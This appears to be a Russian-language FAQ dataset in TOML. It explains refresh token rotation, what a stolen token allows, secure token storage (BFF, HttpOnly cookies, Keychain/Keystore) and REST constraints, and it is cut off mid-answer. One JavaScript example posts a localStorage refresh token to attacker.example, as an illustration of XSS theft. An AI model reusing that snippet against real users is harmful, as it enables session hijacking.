[[questions]]
  id = 7
  question = "Можно ли использовать refresh token несколько раз?"
  answer = "Да, **это зависит от выбранной стратегии управления refresh-токенами**.\n\n### Вариант 1. Многоразовый refresh token\n\nОдин refresh token можно использовать несколько раз до его:\n\n- истечения;\n    \n- отзыва;\n    \n- завершения пользовательской сессии;\n    \n- блокировки пользователя.\n    \n\n```text\nRefresh A → новый Access 1\nRefresh A → новый Access 2\nRefresh A → новый Access 3\n```\n\nТакой подход технически допустим: OAuth 2.0 не требует обязательной замены refresh token при каждом обновлении. Сервер при успешном обновлении может вернуть новый refresh token, но это не обязательно.\n\nГлавный недостаток: если `Refresh A` украдут, серверу трудно определить, кто его использует — настоящий клиент или злоумышленник.\n\n### Вариант 2. Одноразовый refresh token с ротацией\n\nПри каждом обновлении сервер:\n\n1. принимает текущий refresh token;\n    \n2. помечает его использованным;\n    \n3. выпускает новый access token;\n    \n4. выпускает новый refresh token.\n    \n\n```text\nRefresh A → Access 1 + Refresh B\nRefresh B → Access 2 + Refresh C\nRefresh C → Access 3 + Refresh D\n```\n\nПосле получения `Refresh B` повторное использование `Refresh A` запрещено:\n\n```text\nRefresh A → 401 Unauthorized\n```\n\nЭто называется **refresh token rotation**. Современные рекомендации OAuth требуют для публичных клиентов использовать либо ротацию refresh-токенов, либо криптографическую привязку токена к конкретному клиенту. \n\n### Зачем обнаруживать повторное использование\n\nПредположим:\n\n```text\n1. Злоумышленник украл Refresh A.\n2. Пользователь применил Refresh A и получил Refresh B.\n3. Refresh A стал недействительным.\n4. Злоумышленник повторно отправляет Refresh A.\n```\n\nСервер обнаруживает использование уже погашенного токена. Это указывает на возможную кражу.\n\nОбычно после этого сервер отзывает всё семейство токенов:\n\n```text\nRefresh A\n    ↓\nRefresh B\n    ↓\nRefresh C\n```\n\nПользователю потребуется снова пройти аутентификацию. RFC 9700 прямо описывает ротацию как механизм обнаружения повторного использования украденного refresh token. \n\n### Проблема параллельных запросов\n\nКлиент может почти одновременно отправить два запроса:\n\n```text\nЗапрос 1: Refresh A → Refresh B\nЗапрос 2: Refresh A → ошибка повторного использования\n```\n\nВторой запрос может выглядеть как атака, хотя его отправил настоящий клиент. Поэтому обновление должно выполняться атомарно:\n\n```text\nпроверить Refresh A\n→ пометить использованным\n→ создать Refresh B\n→ зафиксировать транзакцию\n```\n\nНа клиенте также желательно не запускать несколько обновлений одновременно: один процесс обновляет токен, остальные запросы ожидают его результат.\n\n### Что выбрать\n\nДля простой внутренней системы допустим многоразовый refresh token при условии, что он:\n\n- хранится на сервере или связан с серверной сессией;\n    \n- имеет ограниченный срок жизни;\n    \n- может быть отозван;\n    \n- передаётся только через TLS;\n    \n- надёжно хранится клиентом.\n    \n\nДля публичного веб-приложения, мобильного клиента или системы с повышенными требованиями безопасности предпочтительна ротация:\n\n```text\nкаждое использование\n→ новый refresh token\n→ старый становится недействительным\n```\n\nИтого: **refresh token можно сделать многоразовым, но безопаснее выдавать новый при каждом обновлении и запрещать повторное использование старого**."
  popularity = 2.63

[[questions]]
  id = 8
  question = "Что будет, если украли refresh token?"
  answer = "### Что получает злоумышленник\n\nУкраденный refresh token позволяет запрашивать новые access-токены от имени пользователя:\n\n```text\nУкраденный refresh token\n        ↓\nPOST /auth/refresh\n        ↓\nНовый access token\n        ↓\nДоступ к API с правами пользователя\n```\n\nЗлоумышленник сможет выполнять операции в пределах `scope` и полномочий, связанных с refresh token. В отличие от короткоживущего access token, refresh token часто действует дольше, поэтому утечка может обеспечить продолжительный доступ к учётной записи. Refresh token должен передаваться только серверу авторизации, храниться конфиденциально и использоваться через TLS. \n\n### Без ротации\n\nПри многоразовом refresh token ситуация выглядит так:\n\n```text\nПользователь:    Refresh A → Access 1\nЗлоумышленник:   Refresh A → Access 2\nПользователь:    Refresh A → Access 3\nЗлоумышленник:   Refresh A → Access 4\n```\n\nОба могут пользоваться одним токеном до тех пор, пока он:\n\n- не истечёт;\n    \n- не будет отозван;\n    \n- не станет недействительным из-за завершения сессии;\n    \n- не будет заблокирован сервером.\n    \n\nПри этом серверу сложно отличить легитимное использование от использования украденной копии.\n\n### При ротации refresh token\n\nПри каждом обновлении старый токен заменяется новым:\n\n```text\nRefresh A → Access 1 + Refresh B\nRefresh B → Access 2 + Refresh C\n```\n\n`Refresh A` после первого использования становится недействительным.\n\nЕсли токен украли, возможны два сценария.\n\n#### Пользователь применил токен первым\n\n```text\nПользователь:\nRefresh A → Refresh B\n\nЗлоумышленник:\nRefresh A → повторное использование\n```\n\nСервер видит попытку использовать уже погашенный токен и обнаруживает возможную компрометацию.\n\n#### Злоумышленник применил токен первым\n\n```text\nЗлоумышленник:\nRefresh A → Refresh B\n\nПользователь:\nRefresh A → повторное использование\n```\n\nСервер также обнаруживает повторное использование, но не может надёжно определить, какая сторона является настоящим пользователем.\n\nПоэтому при обнаружении повторного использования обычно отзывается всё семейство refresh-токенов:\n\n```text\nRefresh A → Refresh B → Refresh C\n      вся цепочка отзывается\n```\n\nПользователю приходится снова пройти аутентификацию. RFC 9700 требует для публичных клиентов применять механизм обнаружения повторного использования refresh token — ротацию либо привязку токена к конкретному отправителю. \n\n### Что происходит с уже выданными access-токенами\n\nОтзыв refresh token прежде всего запрещает выпуск новых access-токенов. Но уже выданный access JWT может продолжить работать до своего `exp`, если API проверяет только:\n\n```text\nподпись + exp + iss + aud\n```\n\nНапример:\n\n```text\n12:00 — злоумышленник получил access token до 12:15\n12:02 — refresh token отозван\n12:02–12:15 — access token может продолжать работать\n12:15 — access token истекает\n```\n\nЧтобы прекратить доступ немедленно, система должна дополнительно:\n\n- отозвать связанные access-токены;\n    \n- заблокировать серверную сессию;\n    \n- проверять `jti` или `session_id` в Redis/БД;\n    \n- использовать introspection для непрозрачных токенов.\n    \n\nRFC 7009 указывает, что при отзыве refresh token серверу следует также аннулировать access-токены, выданные в рамках того же authorization grant, если такая возможность поддерживается. \n\n### Как должна реагировать система\n\nПри подтверждённой утечке сервер должен:\n\n1. Отозвать украденный refresh token.\n    \n2. Отозвать всё его семейство при использовании ротации.\n    \n3. Завершить соответствующую пользовательскую сессию.\n    \n4. По возможности отозвать связанные access-токены.\n    \n5. Потребовать повторную аутентификацию.\n    \n6. Зафиксировать IP, устройство и время подозрительного обновления.\n    \n7. Уведомить пользователя о завершении сессии.\n    \n8. Проверить источник утечки.\n    \n\nСтандартный endpoint отзыва выглядит примерно так:\n\n```http\nPOST /auth/revoke\nContent-Type: application/x-www-form-urlencoded\n\ntoken=<refresh-token>&token_type_hint=refresh_token\n```\n\nПосле успешного отзыва токен больше не должен использоваться, хотя в распределённой системе возможна небольшая задержка распространения информации между сервисами. \n\n### Как уменьшить последствия кражи\n\nПрактичная схема:\n\n```text\nAccess token:\nкороткий срок — например, 5–15 минут\n\nRefresh token:\nсерверная сессия\n+ ротация при каждом использовании\n+ обнаружение повторного использования\n+ абсолютный срок жизни\n+ срок неактивности\n+ возможность отзыва\n```\n\nТакже refresh token желательно:\n\n- хранить в виде хеша на сервере;\n    \n- привязывать к конкретной сессии и клиенту;\n    \n- не записывать в логи;\n    \n- не передавать ресурсным API;\n    \n- защищать от XSS и утечек из клиентского хранилища;\n    \n- для браузера хранить в `HttpOnly`, `Secure`, правильно настроенной cookie;\n    \n- обновлять атомарно, чтобы параллельные запросы не создавали ложное обнаружение кражи.\n    \n\n### Важное уточнение\n\nПроблема не зависит от того, является refresh token JWT или случайной непрозрачной строкой:\n\n```text\nJWT refresh token\nили\nopaque refresh token\n```\n\nЕсли злоумышленник может предъявить действительный bearer refresh token серверу авторизации, он может попытаться получить новый access token.\n\nГлавная опасность кражи refresh token — не чтение его payload, а возможность **долго поддерживать доступ к учётной записи, постоянно выпуская новые access-токены**. Ротация ограничивает эту возможность и позволяет обнаружить повторное использование."
  popularity = 2.63

[[questions]]
  id = 9
  question = "Где хранить access token и refresh token?"
  answer = "### Для браузерного приложения с backend\n\nНаиболее безопасная схема — **не передавать JWT в JavaScript вообще**:\n\n```text\nБраузер\n   │ HttpOnly session cookie\n   ▼\nBackend / BFF\n   │ access token\n   ▼\nAPI\n```\n\n- access token хранится на backend, обычно в памяти, Redis или серверном хранилище сессий;\n    \n- refresh token хранится только на backend, желательно в зашифрованном виде или как хеш;\n    \n- браузер получает только идентификатор серверной сессии в cookie.\n    \n\nПример cookie:\n\n```text\nSet-Cookie: __Host-session=opaque_random_value;\n            Path=/;\n            Secure;\n            HttpOnly;\n            SameSite=Lax\n```\n\nТакая схема называется **Backend for Frontend — BFF**. Она не позволяет JavaScript прочитать и украсть access или refresh token. Актуальные рекомендации IETF для браузерных приложений рассматривают BFF как наиболее защищённый вариант: OAuth-токены остаются на сервере, а браузер работает через cookie-сессию. \n\n### Что означают параметры cookie\n\n- `HttpOnly` — JavaScript не может прочитать cookie через `document.cookie`;\n    \n- `Secure` — cookie передаётся только по HTTPS;\n    \n- `SameSite` — ограничивает отправку cookie при межсайтовых запросах;\n    \n- `Path=/` — область действия cookie;\n    \n- префикс `__Host-` требует `Secure`, `Path=/` и отсутствия `Domain`, что ограничивает возможность подмены cookie поддоменами. \n    \n\n`SameSite=Strict` безопаснее, но может мешать OAuth-переходам и некоторым внешним ссылкам. Для обычной серверной сессии часто применяется:\n\n```text\nSameSite=Lax\n```\n\nПри действительно межсайтовой архитектуре может потребоваться:\n\n```text\nSameSite=None; Secure\n```\n\nВ таком случае необходима полноценная защита от CSRF.\n\n### Для SPA без BFF\n\nКогда frontend непосредственно обращается к API, компромиссный вариант выглядит так:\n\n```text\nAccess token  → только в памяти JavaScript\nRefresh token → HttpOnly cookie или изолированное хранилище\n```\n\n#### Access token\n\nAccess token желательно хранить только в оперативной памяти:\n\n```javascript\nlet accessToken = null;\n```\n\nПосле перезагрузки страницы он исчезнет, но его можно заново получить через защищённый refresh-механизм.\n\nБолее изолированный вариант:\n\n```text\nWeb Worker\n    └── хранит и использует токен\n```\n\nХранение в памяти уменьшает время, в течение которого токен можно похитить, но не защищает полностью: при работающем XSS злоумышленник может отправлять запросы от имени пользователя даже без прямого чтения токена. IETF отдельно рассматривает хранение токенов в памяти и Web Worker как более изолированные варианты по сравнению с постоянным browser storage. \n\n#### Refresh token\n\nRefresh token можно помещать в отдельную cookie:\n\n```text\nSet-Cookie: __Host-refresh=<token>;\n            Path=/auth/refresh;\n            Secure;\n            HttpOnly;\n            SameSite=Strict\n```\n\nОграниченный `Path` означает, что cookie будет отправляться только на endpoint обновления:\n\n```text\nPOST /auth/refresh\n```\n\nВ этом случае JavaScript не сможет прочитать refresh token:\n\n```javascript\ndocument.cookie // refresh token здесь недоступен\n```\n\nНо cookie автоматически отправляется браузером, поэтому необходимо учитывать CSRF:\n\n- использовать `SameSite`;\n    \n- проверять `Origin` и/или `Referer`;\n    \n- при необходимости использовать CSRF-токен;\n    \n- принимать только `POST`;\n    \n- не выполнять обновление через `GET`;\n    \n- настроить CORS без широкого `Access-Control-Allow-Origin: *`.\n    \n\n`HttpOnly` препятствует чтению cookie через XSS, но не предотвращает отправку запросов из скомпрометированной страницы и сам по себе не является защитой от CSRF. \n\n### Почему не следует использовать localStorage\n\nНе рекомендуется:\n\n```javascript\nlocalStorage.setItem(\"access_token\", accessToken);\nlocalStorage.setItem(\"refresh_token\", refreshToken);\n```\n\nЛюбой JavaScript, выполняющийся в origin приложения, может получить токены:\n\n```javascript\nfetch(\"https://attacker.example/steal\", {\n    method: \"POST\",\n    body: localStorage.getItem(\"refresh_token\"),\n});\n```\n\nКод может появиться через:\n\n- XSS;\n    \n- скомпрометированную npm-зависимость;\n    \n- сторонний аналитический скрипт;\n    \n- заражённый CDN;\n    \n- ошибку в собственном frontend-коде.\n    \n\nOWASP прямо рекомендует не хранить JWT, идентификаторы сессий и refresh-токены в `localStorage` или `sessionStorage`, поскольку они доступны JavaScript. \n\n### А sessionStorage безопаснее?\n\n`sessionStorage` очищается после закрытия вкладки и не разделяется между вкладками, поэтому последствия утечки могут быть немного ограничены.\n\nНо с точки зрения XSS:\n\n```text\nlocalStorage  → доступен JavaScript\nsessionStorage → тоже доступен JavaScript\n```\n\nПоэтому `sessionStorage` не является безопасным хранилищем для долгоживущего refresh token. Для короткоживущего access token это иногда применяется как компромисс, но хранение только в памяти предпочтительнее. \n\n### Можно ли хранить JWT прямо в HttpOnly cookie\n\nМожно:\n\n```http\nSet-Cookie: access_token=<jwt>;\n            Secure;\n            HttpOnly;\n            SameSite=Lax\n```\n\nНо тогда JWT фактически используется как cookie-сессия:\n\n```text\nБраузер автоматически отправляет JWT\n→ возникает CSRF-модель угроз\n```\n\nПлюсы:\n\n- токен нельзя напрямую прочитать через JavaScript;\n    \n- уменьшается риск кражи токена посредством простого XSS;\n    \n- удобно для браузерного приложения.\n    \n\nМинусы:\n\n- необходима CSRF-защита;\n    \n- cookie будет отправляться автоматически;\n    \n- logout и отзыв JWT остаются отдельной проблемой;\n    \n- большой JWT передаётся с каждым запросом;\n    \n- браузерная cookie может иметь ограничения по размеру.\n    \n\nЧасто лучше положить в cookie не JWT, а случайный идентификатор серверной сессии:\n\n```text\ncookie: session_id=Jfp7dQ...\nRedis:  session_id → user_id, access_token, refresh_token\n```\n\nЭто упрощает немедленный logout, отзыв сессии и обновление прав.\n\n### Где хранить токены на сервере\n\n#### Access token\n\nAccess token обычно хранится:\n\n- в оперативной памяти процесса;\n    \n- в Redis с TTL;\n    \n- внутри серверной сессии;\n    \n- иногда вообще не хранится, если сервер сам выпускает JWT.\n    \n\nПример:\n\n```text\nsession:abc:\n    user_id = 42\n    access_token = ...\n    expires_at = ...\n```\n\n#### Refresh token\n\nRefresh token требует более строгой защиты:\n\n```text\nRedis / база данных\n    ├── hash refresh token\n    ├── user_id\n    ├── session_id\n    ├── family_id\n    ├── expires_at\n    ├── used_at\n    └── revoked_at\n```\n\nДля собственного opaque refresh token лучше хранить его хеш:\n\n```python\nstored_hash = sha256(refresh_token.encode()).hexdigest()\n```\n\nЭто похоже на хранение пароля:\n\n```text\nКлиент хранит оригинал\nСервер хранит хеш\n```\n\nПри краже базы злоумышленник не получает готовые refresh-токены.\n\nДля ротации необходимо атомарно:\n\n```text\nпроверить старый токен\n→ пометить использованным\n→ создать новый токен\n→ сохранить новый хеш\n```\n\nRefresh-токены публичных клиентов должны использовать ротацию либо быть криптографически привязаны к клиенту. \n\n### Мобильные приложения\n\nВ мобильном приложении refresh token следует хранить в системном защищённом хранилище:\n\n```text\niOS     → Keychain\nAndroid → хранилище с ключом из Android Keystore\n```\n\nAccess token можно держать:\n\n- в оперативной памяти;\n    \n- при необходимости — в том же защищённом хранилище, но с коротким сроком жизни.\n    \n\nApple Keychain предоставляет зашифрованное хранилище для небольших секретов. Android Keystore позволяет хранить криптографические ключи так, чтобы ключевой материал нельзя было непосредственно извлечь с устройства; этим ключом можно шифровать сохранённый refresh token. \n\nНе следует хранить refresh token в:\n\n```text\nобычных SharedPreferences\nSQLite без шифрования\nобычном файле\nлогах приложения\n```\n\n### Межсервисное взаимодействие\n\nДля backend-сервиса:\n\n```text\nAccess token → память или краткоживущий Redis-кэш\nRefresh token → зашифрованное серверное хранилище\nClient secret → Secret Manager / Vault / защищённая конфигурация\n```\n\nНе следует хранить токены:\n\n- в исходном коде;\n    \n- в Git;\n    \n- в Docker image;\n    \n- в открытых логах;\n    \n- в URL;\n    \n- в необработанных трассировках запросов.\n    \n\n### Рекомендуемая схема для FastAPI и браузерного frontend\n\nДля обычного собственного frontend и FastAPI наиболее практичный вариант:\n\n```text\nБраузер:\n    __Host-session в HttpOnly cookie\n\nFastAPI:\n    session_id → Redis\n\nRedis:\n    user_id\n    refresh_token_hash или зашифрованный refresh token\n    текущий token family\n    expires_at\n    revoked_at\n\nAccess JWT:\n    создаётся или обновляется на backend\n    используется backend/BFF при вызове сервисов\n```\n\nКогда frontend должен обращаться к API напрямую:\n\n```text\nAccess token:\n    только в памяти frontend\n    срок 5–15 минут\n\nRefresh token:\n    Secure + HttpOnly cookie\n    Path=/auth/refresh\n    ротация при каждом использовании\n    защита от CSRF\n```\n\n### Итог\n\nДля браузера лучший вариант:\n\n```text\nAccess token  → backend/BFF\nRefresh token → backend/BFF\nБраузер       → только HttpOnly session cookie\n```\n\nДопустимый компромисс для SPA:\n\n```text\nAccess token  → память\nRefresh token → Secure HttpOnly cookie\n```\n\nДля мобильного приложения:\n\n```text\nAccess token  → память\nRefresh token → Keychain / Keystore-защищённое хранилище\n```\n\nНаиболее нежелательный вариант:\n\n```text\nAccess token  → localStorage\nRefresh token → localStorage\n```\n\nОсобенно опасно хранить в `localStorage` refresh token, поскольку его кража позволяет злоумышленнику продолжительное время выпускать новые access-токены."
  popularity = 2.63

[[questions]]
  id = 10
  question = "Что такое REST (Representational State Transfer) и RESTfull как архитектурный стиль, и какие ограничения (constraints) лежат в его основе?"
  answer = "### Что такое REST\n\n**REST — Representational State Transfer** — архитектурный стиль для построения распределённых гипермедийных систем. Он был сформулирован Роем Филдингом в докторской диссертации 2000 года как набор архитектурных ограничений, из которых выводятся свойства современной веб-архитектуры: масштабируемость, независимость компонентов, кэшируемость и единообразное взаимодействие. REST — не протокол, не формат данных и не библиотека. \n\nПравильное написание:\n\n```text\nRESTful\n```\n\nа не `RESTfull`.\n\n**RESTful-система** — система, которая следует ограничениям REST. На практике словом RESTful часто называют любой HTTP API с JSON и маршрутами вроде `/users/42`, но строго этого недостаточно: соответствие REST определяется архитектурными ограничениями, а не только использованием HTTP-методов. \n\n### Что означает Representational State Transfer\n\nНазвание можно разобрать так:\n\n- **Resource** — ресурс;\n    \n- **Representation** — представление ресурса;\n    \n- **State** — состояние приложения;\n    \n- **Transfer** — передача представлений между клиентом и сервером.\n    \n\n#### Ресурс\n\nРесурс — некоторая сущность или концепция, идентифицируемая URI:\n\n```text\n/users/42\n/orders/1001\n/articles/rest\n```\n\nРесурсом может быть:\n\n- пользователь;\n    \n- заказ;\n    \n- документ;\n    \n- коллекция;\n    \n- результат вычисления;\n    \n- текущее состояние операции.\n    \n\nHTTP называет целью запроса ресурс, а URI используется для его идентификации. \n\n#### Представление ресурса\n\nКлиент обычно получает не сам ресурс, а его **представление**:\n\n```text\nGET /users/42\nAccept: application/json\n```\n\n```json\n{\n  \"id\": 42,\n  \"username\": \"alfob\"\n}\n```\n\nЭтот же ресурс может иметь другое представление:\n\n```text\nGET /users/42\nAccept: application/xml\n```\n\n```xml\n<user>\n    <id>42</id>\n    <username>alfob</username>\n</user>\n```\n\nРесурс и его представление — не одно и то же:\n\n```text\nРесурс:\n    пользователь с ID 42\n\nПредставления:\n    JSON\n    XML\n    HTML\n    изображение\n```\n\nHTTP отделяет идентификацию ресурса от представления и семантики операции над ним. \n\n#### Передача состояния\n\nКлиент получает представления ресурсов и на их основе изменяет состояние своего взаимодействия с системой.\n\nНапример:\n\n```text\nКлиент находится на списке заказов\n        ↓\nполучает ссылку на заказ 1001\n        ↓\nпереходит к заказу 1001\n        ↓\nполучает допустимое действие «оплатить»\n        ↓\nпереходит к оплате\n```\n\nПередаваемые сервером представления содержат данные и, в полном REST-подходе, ссылки или элементы управления, позволяющие клиенту перейти в следующее состояние приложения.\n\n### REST и HTTP\n\nREST не требует обязательного использования HTTP. Теоретически REST-ограничения можно реализовать поверх другого протокола.\n\nОднако HTTP хорошо соответствует REST:\n\n- URI идентифицирует ресурс;\n    \n- методы выражают семантику операции;\n    \n- заголовки описывают сообщение;\n    \n- статус-коды сообщают результат;\n    \n- `Content-Type` описывает представление;\n    \n- HTTP поддерживает кэширование и посредников.\n    \n\nHTTP является stateless-протоколом запрос–ответ с единообразным интерфейсом и самодостаточными сообщениями, поэтому он естественно подходит для реализации REST. \n\n### Архитектурные ограничения REST\n\nREST строится на шести ограничениях:\n\n```text\n1. Client–Server\n2. Stateless\n3. Cache\n4. Uniform Interface\n5. Layered System\n6. Code on Demand — необязательное\n```\n\nЭти ограничения применяются совместно. Их цель — не просто определить внешний вид URL, а сформировать свойства всей системы. \n\n---\n\n### 1. Client–Server — разделение клиента и сервера\n\nКлиент и сервер имеют разные обязанности:\n\n```text\nКлиент:\n    интерфейс\n    отображение\n    пользовательское взаимодействие\n\nСервер:\n    бизнес-логика\n    данные\n    авторизация\n    обработка запросов\n```\n\n```text\nClient ──request──> Server\nClient <─response── Server\n```\n\nКлиенту не требуется знать:\n\n- какая база данных используется;\n    \n- как устроены таблицы;\n    \n- на каком языке написан сервер;\n    \n- как сервер реализует бизнес-логику.\n    \n\nСерверу не требуется знать:\n\n- как устроен интерфейс клиента;\n    \n- является клиент браузером, мобильным приложением или другим сервисом.\n    \n\nЭто позволяет развивать клиент и сервер независимо, пока сохраняется контракт взаимодействия. Филдинг выводит REST из клиент-серверного стиля именно для разделения обязанностей и независимой эволюции компонентов. \n\n---\n\n### 2. Stateless — отсутствие состояния клиентской сессии на сервере\n\nКаждый запрос должен содержать всю информацию, необходимую для его обработки.\n\nНапример:\n\n```text\nGET /api/profile\nAuthorization: Bearer <access-token>\nAccept: application/json\n```\n\nСервер не должен зависеть от скрытого контекста предыдущего запроса:\n\n```text\nПлохо:\n\nЗапрос 1: «Выбрать пользователя 42»\nЗапрос 2: «Показать его заказы»\n\nСервер должен помнить, кого означает «его».\n```\n\n```text\nStateless:\n\nGET /users/42/orders\n```\n\nКаждый запрос можно понять независимо.\n\n#### Что stateless не означает\n\nStateless не означает, что сервер не хранит никаких данных.\n\nСервер может хранить:\n\n- пользователей;\n    \n- заказы;\n    \n- товары;\n    \n- платежи;\n    \n- файлы;\n    \n- состояние бизнес-процессов.\n    \n\nОграничение касается **контекста клиентской сессии между запросами**:\n\n```text\nСостояние ресурсов в БД        → допустимо\nНеявный контекст диалога       → нарушает stateless\n```\n\nФилдинг определяет stateless-взаимодействие так: каждый запрос клиента должен содержать всю необходимую информацию, а сервер не должен использовать сохранённый контекст предыдущих запросов для его понимания. \n\n#### Преимущества\n\n- любой экземпляр сервера может обработать запрос;\n    \n- проще горизонтальное масштабирование;\n    \n- проще восстановление после сбоя;\n    \n- запросы проще анализировать и повторять;\n    \n- серверу не нужно синхронизировать контекст сессии между экземплярами.\n    \n\n#### Недостатки\n\n- часть контекста приходится отправлять повторно;\n    \n- запросы могут стать больше;\n    \n- клиент должен управлять своим состоянием;\n    \n- авторизационные данные приходится передавать с каждым защищённым запросом.\n    \n\n---\n\n### 3. Cacheable — кэшируемость\n\nОтвет должен явно или неявно определяться как:\n\n```text\ncacheable\n```\n\nили:\n\n```text\nnon-cacheable\n```\n\nПример:\n\n```text\nHTTP/1.1 200 OK\nCache-Control: public, max-age=300\nETag: \"user-42-v7\"\nContent-Type: application/json\n```\n\nКэш может находиться:\n\n- в браузере;\n    \n- в мобильном приложении;\n    \n- в reverse proxy;\n    \n- в CDN;\n    \n- в API Gateway;\n    \n- в промежуточном сервере.\n    \n\n```text\nClient → Cache → Server\n          │\n          └── может вернуть сохранённый ответ\n```\n\nПреимущества:\n\n- меньше запросов к серверу;\n    \n- ниже задержка;\n    \n- меньше сетевой трафик;\n    \n- выше масштабируемость.\n    \n\nНедостаток — риск устаревших данных. Поэтому кэширование должно управляться явно через механизмы вроде:\n\n```text\nCache-Control\nETag\nIf-None-Match\nLast-Modified\nIf-Modified-Since\n```\n\nREST добавляет ограничение кэшируемости поверх stateless-взаимодействия, чтобы повысить эффективность и воспринимаемую производительность системы. HTTP предоставляет стандартные механизмы для реализации такого кэширования. \n\n---\n\n### 4. Uniform Interface — единообразный интерфейс\n\nЭто центральное ограничение REST. Все компоненты взаимодействуют через общий, стандартизированный интерфейс, а не через уникальные команды для каждого типа объекта. \n\nВ HTTP роль такого интерфейса выполняют:\n\n- URI;\n    \n- стандартные методы;\n    \n- статус-коды;\n    \n- заголовки;\n    \n- представления ресурсов;\n    \n- ссылки и элементы управления.\n    \n\nНапример:\n\n```text\nGET /users/42\nDELETE /users/42\nPUT /users/42\n```\n\nВместо процедурных команд:\n\n```text\nPOST /getUser\nPOST /deleteUser\nPOST /replaceUser\n```\n\nUniform Interface включает четыре более конкретных ограничения.\n\n#### 4.1. Identification of resources — идентификация ресурсов\n\nКаждый ресурс должен иметь стабильный идентификатор:\n\n```text\n/users/42\n/orders/1001\n/orders/1001/items\n```\n\nURI идентифицирует ресурс, а не конкретное действие над ним.\n\nПредпочтительно:\n\n```text\nGET /users/42\nDELETE /users/42\n```\n\nВместо:\n\n```text\nPOST /get-user\nPOST /delete-user\n```\n\nЭто не означает, что URI обязан содержать существительное при любых обстоятельствах, но в ресурсной модели действия обычно выражаются семантикой метода, а не глаголом в URL.\n\n#### 4.2. Manipulation through representations — управление через представления\n\nКлиент изменяет ресурс, передавая его представление или описание изменения:\n\n```text\nPUT /users/42\nContent-Type: application/json\n\n{\n  \"username\": \"new_name\",\n  \"email\": \"new@example.com\"\n}\n```\n\nИли частичное изменение:\n\n```text\nPATCH /users/42\nContent-Type: application/merge-patch+json\n\n{\n  \"email\": \"new@example.com\"\n}\n```\n\nКлиент не получает прямого доступа к внутреннему объекту или строке базы данных. Он взаимодействует через сетевое представление ресурса.\n\n#### 4.3. Self-descriptive messages — самодостаточные сообщения\n\nСообщение должно содержать достаточно информации, чтобы получатель понял, как его обработать:\n\n```text\nPOST /orders\nContent-Type: application/json\nAuthorization: Bearer <token>\nAccept: application/json\n```\n\n```json\n{\n  \"product_id\": 15,\n  \"quantity\": 2\n}\n```\n\nЗдесь явно указаны:\n\n- операция — `POST`;\n    \n- целевой ресурс — `/orders`;\n    \n- формат тела — `application/json`;\n    \n- ожидаемый формат ответа;\n    \n- авторизационные данные.\n    \n\nОтвет также должен быть самодостаточным:\n\n```text\nHTTP/1.1 201 Created\nLocation: /orders/1001\nContent-Type: application/json\n```\n\n```json\n{\n  \"id\": 1001,\n  \"status\": \"created\"\n}\n```\n\nHTTP определяет семантику сообщения через метод, статус-код, поля заголовков и метаданные представления. \n\n#### 4.4. HATEOAS — управление состоянием приложения через гипермедиа\n\nПолное название:\n\n```text\nHypermedia As The Engine Of Application State\n```\n\nСервер возвращает не только данные, но и допустимые дальнейшие действия:\n\n```json\n{\n  \"id\": 1001,\n  \"status\": \"pending\",\n  \"_links\": {\n    \"self\": {\n      \"href\": \"/orders/1001\"\n    },\n    \"payment\": {\n      \"href\": \"/orders/1001/payment\",\n      \"method\": \"POST\"\n    },\n    \"cancel\": {\n      \"href\": \"/orders/1001/cancellation\",\n      \"method\": \"POST\"\n    }\n  }\n}\n```\n\nПосле оплаты представление может измениться:\n\n```json\n{\n  \"id\": 1001,\n  \"status\": \"paid\",\n  \"_links\": {\n    \"self\": {\n      \"href\": \"/orders/1001\"\n    },\n    \"receipt\": {\n      \"href\": \"/orders/1001/receipt\"\n    }\n  }\n}\n```\n\nСсылки `payment` и `cancel` исчезли, потому что эти переходы больше недоступны.\n\nИдея заключается в том, что клиент не должен заранее жёстко знать все URI и переходы. Он знает начальную точку и стандартные типы представлений, а дальнейшие действия узнаёт из ответов сервера.\n\nИменно гипермедиа отличает строгий REST от большинства API, которые сегодня называют RESTful. Обычный CRUD API может соблюдать ресурсность, HTTP-семантику и stateless-подход, но не реализовывать полноценный HATEOAS.\n\n---\n\n### 5. Layered System — слоистая система\n\nКлиент не должен знать, взаимодействует ли он непосредственно с конечным сервером или с промежуточным компонентом.\n\n```text\nClient\n   ↓\nCDN\n   ↓\nReverse Proxy\n   ↓\nAPI Gateway\n   ↓\nApplication\n   ↓\nDatabase\n```\n\nПромежуточными слоями могут быть:\n\n- балансировщик нагрузки;\n    \n- CDN;\n    \n- reverse proxy;\n    \n- API Gateway;\n    \n- сервис авторизации;\n    \n- кэш;\n    \n- WAF;\n    \n- service mesh.\n    \n\nКаждый компонент взаимодействует только с непосредственным соседом и не обязан знать всю внутреннюю топологию.\n\nЭто позволяет:\n\n- добавлять балансировку;\n    \n- централизовать безопасность;\n    \n- использовать кэширование;\n    \n- скрывать внутренние сервисы;\n    \n- масштабировать компоненты независимо.\n    \n\nНедостатки:\n\n- дополнительная задержка;\n    \n- более сложная диагностика;\n    \n- сложнее определить источник ошибки;\n    \n- промежуточные слои могут изменять или ограничивать сообщения.\n    \n\nФилдинг отмечает, что layered system ограничивает знание компонента только ближайшим уровнем взаимодействия и позволяет добавлять посредников для масштабирования, безопасности и инкапсуляции устаревших систем. \n\n---\n\n### 6. Code on Demand — код по требованию\n\nЭто единственное **необязательное** ограничение REST.\n\nСервер может передавать клиенту исполняемый код, расширяющий его возможности:\n\n```text\nHTML\n ↓\nJavaScript от сервера\n ↓\nвыполнение в браузере\n```\n\nПример:\n\n```html\n<script src=\"/static/app.js\"></script>\n```\n\nПреимущество:\n\n- сервер может динамически расширять функциональность клиента;\n    \n- часть обработки переносится на клиент;\n    \n- клиенту не обязательно заранее реализовывать всю логику.\n    \n\nНедостатки:\n\n- ухудшается прозрачность взаимодействия;\n    \n- сложнее анализировать поведение системы;\n    \n- появляются дополнительные риски безопасности;\n    \n- поведение зависит от исполняемой среды клиента.\n    \n\nПоскольку это ограничение необязательно, система может считаться RESTful без передачи исполняемого кода. \n\n### Роль HTTP-методов\n\nHTTP-метод задаёт семантику операции, а URI определяет целевой ресурс:\n\n```text\nGET    /users/42\nPOST   /users\nPUT    /users/42\nPATCH  /users/42\nDELETE /users/42\n```\n\nТипичное значение:\n\n|Метод|Назначение|\n|---|---|\n|`GET`|Получить представление ресурса|\n|`POST`|Передать данные ресурсу для обработки, часто создать подчинённый ресурс|\n|`PUT`|Создать или полностью заменить состояние ресурса по известному URI|\n|`PATCH`|Частично изменить ресурс|\n|`DELETE`|Удалить ресурс|\n|`HEAD`|Получить метаданные ответа без содержимого|\n|`OPTIONS`|Узнать параметры взаимодействия с ресурсом|\n\nВажно: REST не утверждает, что каждый CRUD-метод обязан механически соответствовать одному HTTP-методу. 